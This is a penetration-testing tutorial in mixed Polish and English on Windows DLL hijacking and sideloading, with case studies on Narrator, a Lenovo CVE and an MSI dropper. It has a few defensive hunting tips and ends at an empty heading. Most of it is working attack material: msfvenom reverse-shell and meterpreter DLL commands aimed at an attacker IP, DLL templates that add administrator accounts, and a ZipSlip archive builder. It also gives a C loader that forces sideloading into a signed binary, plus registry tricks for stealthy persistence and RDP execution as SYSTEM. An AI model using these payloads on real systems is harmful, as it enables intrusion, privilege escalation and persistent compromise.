# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking obejmuje manipulowanie zaufaną aplikacją tak, aby załadowała złośliwy DLL. Termin ten obejmuje kilka technik, takich jak **DLL Spoofing, Injection i Side-Loading**. Jest to głównie wykorzystywane do code execution, osiągania persistence oraz, rzadziej, privilege escalation. Mimo że tutaj skupiamy się na escalation, sam sposób hijackingu pozostaje taki sam niezależnie od celu.

### Common Techniques

W DLL hijacking stosuje się kilka metod, a ich skuteczność zależy od strategii ładowania DLL przez aplikację:

1. **DLL Replacement**: Podmiana prawidłowego DLL na złośliwy, opcjonalnie z użyciem DLL Proxying, aby zachować funkcjonalność oryginalnego DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwego DLL wcześniej w ścieżce wyszukiwania niż legalny, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwego DLL, który aplikacja załaduje, myśląc, że jest to wymagany DLL, który nie istnieje.
4. **DLL Redirection**: Modyfikacja parametrów wyszukiwania, takich jak `%PATH%` lub pliki `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwego DLL.
5. **WinSxS DLL Replacement**: Zastąpienie legalnego DLL złośliwym odpowiednikiem w katalogu WinSxS, metoda często kojarzona z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwego DLL w katalogu kontrolowanym przez użytkownika wraz z kopiowaną aplikacją, podobnie jak w technikach Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasyczne DLL sideloading nie jest jedynym sposobem, aby zmusić zaufany proces **.NET Framework** do załadowania kodu attacker. Jeśli docelowy plik wykonywalny jest aplikacją **managed**, CLR sprawdza także plik konfiguracyjny aplikacji o nazwie zgodnej z EXE (na przykład `Setup.exe.config`). Taki plik może definiować własny **AppDomainManager**. Jeśli config wskazuje na assembly kontrolowany przez attacker i umieszczony obok EXE, CLR ładuje go **przed normalną ścieżką kodu aplikacji** i uruchamia go wewnątrz zaufanego procesu.

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft, aby użyć własnego managera, muszą być obecne zarówno `<appDomainManagerAssembly>`, jak i `<appDomainManagerType>`.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalny manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Practical notes:
- This is **.NET Framework specific** tradecraft. It depends on CLR config parsing, not on the Win32 DLL search order.
- The host must really be a **managed EXE**. Quick triage: `sigcheck -m target.exe`, `corflags target.exe`, or check for the **CLR Runtime Header** in PE metadata.
- The config filename must match the executable name exactly (`<binary>.config`) and usually lives **next to the EXE**.
- This is useful with **signed Microsoft/vendor binaries** because the trusted EXE remains untouched while the malicious managed assembly executes in-process.
- If you already have a writable installer/update directory, AppDomainManager hijacking can be used as the **first stage**, followed by classic DLL sideloading or reflective loading for later stages.

### Hijacking an existing scheduled task to relaunch the sideload chain

For persistence, do not only look for **creating a new task**. Some intrusion sets wait until a legitimate installer creates a **normal updater task** and then **rewrite the task action** so the existing name, author, and trigger stay familiar to defenders.

Reusable workflow:
1. Install/run the legitimate software and identify the task it normally creates.
2. Export the task XML and note the current `<Exec><Command>` / `<Arguments>` values.
3. Replace only the action so the task starts your **trusted host EXE** from a user-writable staging directory, which then side-loads or AppDomain-loads the real payload.
4. Re-register the same task name instead of creating a new obvious persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Dlaczego jest bardziej stealthy:
- Nazwa taska nadal może wyglądać legitnie (na przykład updater vendora).
- **Task Scheduler service** uruchamia go, więc walidacja parent/ancestor często widzi oczekiwany łańcuch schedulingu zamiast `explorer.exe`.
- Zespoły DFIR, które polują tylko na **nowe nazwy tasków**, mogą przeoczyć task, którego rejestracja już istniała, ale którego action wskazuje teraz na `%LOCALAPPDATA%`, `%APPDATA%` albo inną ścieżkę kontrolowaną przez atakującego.

Szybkie pivoty huntingowe:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównaj XML z `C:\Windows\System32\Tasks\*` i metadane `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` z baseline.
- Alarmuj, gdy **task wyglądający na updater vendora** uruchamia się z **user-writable directories** albo startuje .NET EXE z plikiem `*.config` w tym samym katalogu.

> [!TIP]
> Aby zobaczyć chain krok po kroku, który łączy HTML staging, konfiguracje AES-CTR i implanty .NET na bazie DLL sideloading, przejrzyj workflow poniżej.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Najczęstszy sposób znajdowania brakujących Dlls w systemie to uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z sysinternals i **ustawienie** **następujących 2 filtrów**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

a potem pokazanie tylko **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Jeśli szukasz **missing dlls ogólnie**, zostaw to uruchomione przez kilka **sekund**.\
Jeśli szukasz **missing dll w konkretnym executable**, ustaw **inny filtr, np. "Process Name" "contains" `<exec name>`, uruchom go i zatrzymaj zbieranie eventów**.

## Exploiting Missing Dlls

Aby eskalować privileges, najlepszą szansą jest możliwość **zapisania dll, którą proces o wyższych privileges spróbuje załadować** w jakimś **miejscu, w którym będzie jej szukał**. Dzięki temu będziemy mogli **zapisać** dll w **folderze**, w którym **dll jest szukana wcześniej** niż folder, w którym znajduje się **oryginalna dll** (dziwny przypadek), albo będziemy mogli **zapisać** ją w folderze, w którym dll będzie szukana, a oryginalna **dll** nie istnieje w żadnym folderze.

### Dll Search Order

**W** [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **możesz znaleźć, jak Dlls są ładowane w szczegółach.**

**Aplikacje Windows** szukają DLLi, używając zestawu **pre-defined search paths** w określonej kolejności. Problem DLL hijacking pojawia się wtedy, gdy złośliwa DLL zostanie umieszczona strategicznie w jednym z tych katalogów, co powoduje, że zostanie załadowana przed oryginalną DLL. Sposobem zapobiegania temu jest używanie przez aplikację absolute paths przy odwołaniach do wymaganych DLLi.

Poniżej widać **DLL search order na systemach 32-bit**:

1. Katalog, z którego aplikacja została załadowana.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby pobrać ścieżkę do tego katalogu.(_C:\Windows\System32_)
3. 16-bitowy katalog systemowy. Nie ma funkcji, która pobiera ścieżkę do tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby pobrać ścieżkę do tego katalogu.
1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Zwróć uwagę, że nie obejmuje to per-application path wskazanego przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany przy wyliczaniu ścieżki wyszukiwania DLL.

To jest **domyślna** kolejność wyszukiwania z włączonym **SafeDllSearchMode**. Gdy jest wyłączony, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) zostanie wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie zaczyna się w katalogu modułu executable, który **LoadLibraryEx** ładuje.

Na koniec zauważ, że **dll może zostać załadowana po podaniu absolute path zamiast samej nazwy**. W takim przypadku ta dll będzie **szukana tylko w tej ścieżce** (jeśli dll ma zależności, będą one szukane tak, jakby zostały załadowane po nazwie).

Istnieją też inne sposoby modyfikowania kolejności wyszukiwania, ale nie będę ich tu wyjaśniał.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Użyj filtrów **ProcMon** (`Process Name` = target EXE, `Path` kończy się na `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których proces szuka, ale nie może znaleźć.
2. Jeśli binary działa w ramach **schedule/service**, wrzucenie DLL o jednej z tych nazw do **application directory** (pozycja #1 w search order) spowoduje jej załadowanie przy następnym uruchomieniu. W jednym przypadku .NET scanner proces szukał `hostfxr.dll` w `C:\samples\app\` zanim załadował prawdziwą kopię z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj payload DLL (np. reverse shell) z dowolnym exportem: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli twoim primitive jest **ZipSlip-style arbitrary write**, przygotuj ZIP, którego wpis ucieka poza extraction dir, tak aby DLL trafiła do folderu aplikacji:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostarcz archiwum do obserwowanej skrzynki odbiorczej/share; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje ono złośliwy DLL i wykona Twój kod jako konto usługi.

### Wymuszanie sideloading przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowanym sposobem na deterministyczne wpływanie na ścieżkę wyszukiwania DLL nowo utworzonego procesu jest ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając tutaj katalog kontrolowany przez atakującego, można zmusić docelowy proces, który rozwiązuje importowany DLL po nazwie (bez absolutnej ścieżki i bez użycia bezpiecznych flag ładowania), do załadowania złośliwego DLL z tego katalogu.

Kluczowa idea
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj własny DllPath wskazujący na Twój kontrolowany folder (np. katalog, w którym znajduje się Twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy docelowy binarny plik rozwiązuje DLL po nazwie, loader będzie uwzględniał ten podany DllPath podczas rozwiązywania, umożliwiając niezawodne sideloading nawet wtedy, gdy złośliwy DLL nie znajduje się w tym samym katalogu co docelowy EXE.

Uwagi/ograniczenia
- Dotyczy to tworzonego procesu potomnego; różni się to od SetDllDirectory, które wpływa tylko na bieżący proces.
- Cel musi importować lub wywoływać LoadLibrary dla DLL po nazwie (bez absolutnej ścieżki i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i zakodowane na sztywno ścieżki absolutne nie mogą zostać przejęte. Forwarded exports i SxS mogą zmienić kolejność.

Minimalny przykład C (ntdll, ciągi wide, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład C: wymuszanie DLL sideloading przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Umieść złośliwy xmllite.dll (eksportujący wymagane funkcje albo proxy do prawdziwego) w katalogu DllPath.
- Uruchom podpisany binary, o którym wiadomo, że wyszukuje xmllite.dll po nazwie, używając powyższej techniki. loader rozwiązuje import przez podany DllPath i sideloaduje twoje DLL.

Ta technika była obserwowana in-the-wild jako napędzająca wieloetapowe łańcuchy sideloading: początkowy launcher zrzuca pomocnicze DLL, które następnie uruchamia podpisany przez Microsoft, podatny na hijack binary z niestandardowym DllPath, aby wymusić załadowanie DLL atakującego z katalogu staging.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Gdy napotkana zostanie **DLL, która ma tę samą nazwę co już załadowana do pamięci**, system omija zwykłe wyszukiwanie. Zamiast tego wykonuje sprawdzenie redirection oraz manifestu, po czym domyślnie używa DLL już znajdującej się w pamięci. **W tym scenariuszu system nie przeprowadza wyszukiwania DLL**.
- W przypadkach, gdy DLL zostanie rozpoznana jako **known DLL** dla bieżącej wersji Windows, system użyje swojej wersji known DLL wraz z wszelkimi zależnymi od niej DLL, **rezygnując z procesu wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych known DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie tych zależnych DLL jest prowadzone tak, jakby były wskazane wyłącznie przez swoje **module names**, niezależnie od tego, czy początkowa DLL została zidentyfikowana przez pełną ścieżkę.

### Escalating Privileges

**Requirements**:

- Zidentyfikuj proces, który działa lub będzie działał z **different privileges** (horizontal or lateral movement), i który **nie ma DLL**.
- Upewnij się, że dostępny jest **write access** do każdego **directory**, w którym **DLL** będzie **searched for**. To miejsce może być katalogiem pliku wykonywalnego albo katalogiem w system path.

Tak, wymagania są trudne do znalezienia, ponieważ **domyślnie to dość dziwne znaleźć uprzywilejowany executable bez dll** i jeszcze **bardziej dziwne mieć uprawnienia zapisu do folderu w system path** (domyślnie nie możesz). Ale w źle skonfigurowanych środowiskach jest to możliwe.\
Jeśli masz szczęście i spełniasz te wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **main goal projektu to bypass UAC**, możesz tam znaleźć **PoC** dla Dll hijaking dla wersji Windows, którego możesz użyć (prawdopodobnie wystarczy tylko zmienić ścieżkę folderu, w którym masz write permissions).

Zwróć uwagę, że możesz **sprawdzić swoje permissions w folderze** wykonując:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów wewnątrz PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz także sprawdzić importy pliku wykonywalnego oraz eksporty dll za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Zdobądź meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86, nie widziałem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Własne

Należy zauważyć, że w kilku przypadkach Dll, którą kompilujesz, musi **eksportować kilka funkcji**, które mają zostać załadowane przez proces ofiary; jeśli te funkcje nie istnieją, **binary nie będzie w stanie ich załadować** i **exploit zakończy się niepowodzeniem**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna biblioteka DLL w C z entry thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe nadal przy starcie sprawdza przewidywalny, zależny od języka localization DLL, który można przejąć dla arbitrary code execution i persistence.

Kluczowe fakty
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli istnieje zapisywalny, kontrolowany przez attacker DLL w ścieżce OneCore, jest on ładowany i wykonywany jest `DllMain(DLL_PROCESS_ATTACH)`. Nie są wymagane żadne exports.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Naive hijack będzie mówił/podświetlał UI. Aby pozostać cicho, po podpięciu wylicz wątki Narrator, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wstrzymaj go przez `SuspendThread`; kontynuuj we własnym wątku. Zobacz PoC po pełny kod.

Trigger and persistence via Accessibility configuration
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Z powyższym, uruchomienie Narrator ładuje podłożoną DLL. Na secure desktop (ekran logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; twoja DLL wykonuje się jako SYSTEM na secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Zezwól na klasyczną warstwę bezpieczeństwa RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się przez RDP z hostem, na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; twoja DLL wykonuje się jako SYSTEM na secure desktop.
- Wykonanie zatrzymuje się, gdy sesja RDP się zamknie — wykonaj inject/migrate natychmiast.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wpis rejestru wbudowanego narzędzia Accessibility Tool (AT) (np. CursorIndicator), zmienić go tak, aby wskazywał na dowolny binary/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. To pośredniczy dowolne wykonanie w ramach frameworku Accessibility.

Notes
- Zapis pod `%windir%\System32` i zmiana wartości HKLM wymaga uprawnień admina.
- Cała logika payload może znajdować się w `DLL_PROCESS_ATTACH`; nie są potrzebne żadne exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ten przypadek pokazuje **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzony jako **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` znajduje się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 AM w kontekście zalogowanego użytkownika.
- **Directory Permissions**: Zapisywalny przez `CREATOR OWNER`, co pozwala lokalnym użytkownikom wrzucać dowolne pliki.
- **DLL Search Behavior**: Próbuje załadować `hostfxr.dll` najpierw z własnego katalogu roboczego i zapisuje "NAME NOT FOUND", jeśli plik jest brakujący, co wskazuje na pierwszeństwo wyszukiwania w lokalnym katalogu.

### Exploit Implementation

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakującą DLL do uzyskania wykonania kodu w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Jako standardowy user, wrzuć `hostfxr.dll` do `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż scheduled task uruchomi się o 9:30 AM w kontekście bieżącego usera.
3. Jeśli w momencie wykonania taska zalogowany jest administrator, malicious DLL uruchomi się w sesji administratora z medium integrity.
4. Połącz standardowe techniki UAC bypass, aby podnieść uprawnienia z medium integrity do uprawnień SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors często łączą droppers oparte na MSI z DLL side-loading, aby uruchamiać payloady w zaufanym, signed process.

Chain overview
- User pobiera MSI. CustomAction uruchamia się po cichu podczas GUI install (np. LaunchApplication albo akcja VBScript), rekonstruując next stage z embedded resources.
- Dropper zapisuje legalny, signed EXE i malicious DLL do tego samego katalogu (przykładowa para: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Gdy signed EXE zostanie uruchomiony, Windows DLL search order ładuje najpierw wsc.dll z working directory, wykonując code attacker'a w signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Szukaj wpisów, które uruchamiają executables albo VBScript. Przykładowy suspicious pattern: LaunchApplication uruchamiające embedded file w background.
- W Orca (Microsoft Orca.exe), sprawdź CustomAction, InstallExecuteSequence i Binary tables.
- Embedded/split payloads w MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Albo użyj lessmsi: lessmsi x package.msi C:\out
- Szukaj wielu małych fragmentów, które są łączone i decrypted przez VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczne sideloading z wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: legalny podpisany host (Avast). Proces próbuje załadować wsc.dll po nazwie ze swojego katalogu.
- wsc.dll: DLL atakującego. Jeśli nie są wymagane konkretne exporty, DllMain może wystarczyć; w przeciwnym razie zbuduj proxy DLL i przekazuj wymagane exporty do prawdziwej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Dla wymagań export, użyj frameworka proxying (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, która dodatkowo wykona Twój payload.

- Ta technika opiera się na rozwiązywaniu nazw DLL przez host binary. Jeśli host używa absolutnych ścieżek albo bezpiecznych flag ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie udać.
- KnownDLLs, SxS i forwarded exports mogą wpływać na precedence i muszą być uwzględnione przy wyborze host binary i zestawu export.

## Signed triads + encrypted payloads (ShadowPad case study)

